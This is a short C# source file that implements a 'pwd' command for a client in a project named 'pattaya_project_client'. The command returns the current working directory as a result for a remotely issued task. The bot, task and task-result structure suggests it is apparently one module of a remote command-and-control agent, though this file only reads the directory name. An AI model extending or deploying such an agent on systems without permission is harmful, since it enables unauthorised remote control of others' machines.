using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class PrintWorkingDirectory : BotCommand
    {
        public override string TaskName => "pwd";

        public override BotTaskResult RunTask(BotTask task)
        {

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = "Current directory: " + Directory.GetCurrentDirectory()
            };
        }
    }
}
